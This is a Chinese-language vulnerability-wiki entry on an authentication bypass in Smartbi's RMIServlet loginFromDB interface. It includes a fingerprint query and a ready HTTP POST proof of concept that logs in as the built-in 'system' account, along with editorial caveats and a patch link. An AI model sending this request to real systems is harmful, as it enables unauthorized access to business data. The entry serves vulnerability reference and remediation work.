---
source: "Threekiii/Vulnerability-Wiki"
title: "Smartbi RMIServlet loginFromDB认证绕过"
product: "Smartbi"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "V7至V10概括，补丁级未知"
prerequisites: "匿名转内置用户"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/Smartbi/Smartbi-RMIServlet-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md"
id: "vw-2c0a50b1b541b216d4c93735"
entity_id: "ve-2c0a50b1b541b216d4c93735"
schema_version: "1"
---

# Smartbi RMIServlet loginFromDB认证绕过

## 条目说明

- 对象与具体问题：Smartbi；RMIServlet loginFromDB认证绕过
- 版本、配置及部署条件：V7至V10概括，补丁级未知
- 认证与权限前提：匿名转内置用户
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- CLIENT_USER_NOT_LOGIN只证明端点要求登录/会话无效，不能证明漏洞存在，是明确误判条件
- 实际PoC需要loginFromDB成功结果及新会话验证，正文没有完整响应
- 补三内置账户和官方版本
- 不要将RMIServlet存在与后端RCE等价

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

### 漏洞描述

该漏洞源于 Smartbi 默认存在内置用户，在使用特定接口时，攻击者可绕过用户身份认证机制获取内置用户身份凭证，随后可使用获取的身份凭证调用后台接口，最终可能导致敏感信息泄露和代码执行。

### 漏洞影响

```
V7 <= Smartbi <=V10
```

### 网络测绘

```
app="SMARTBI"
```

### 漏洞复现

验证漏洞是否存在

```
http://your-ip/smartbi/vision/RMIServlet
```

出现以下回显证明漏洞存在

```
{"retCode":"CLIENT_USER_NOT_LOGIN","result":"尚未登录或会话过期"}
```

poc

```http
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: your-ip
Content-Type: application/x-www-form-urlencoded
 
className=UserService&methodName=loginFromDB&params=["system","0a"]
```

通过获取的Cookie登陆。

### 漏洞修复

官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本：https://www.smartbi.com.cn/patchinfo


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
